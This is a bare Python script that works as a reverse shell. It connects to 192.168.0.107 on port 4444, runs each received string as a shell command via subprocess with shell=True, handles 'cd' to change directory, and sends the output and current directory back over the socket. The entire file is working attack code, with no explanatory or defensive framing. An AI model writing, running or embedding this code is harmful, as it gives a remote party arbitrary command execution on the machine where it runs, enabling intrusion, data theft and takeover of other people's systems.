import socket
import os
import subprocess
sockett = socket.socket()
host = "192.168.0.107"
port = 4444
sockett.connect((host, port))
while True:
    data = sockett.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        sockett.send(str.encode(output_str + currentWD))
        print(output_str)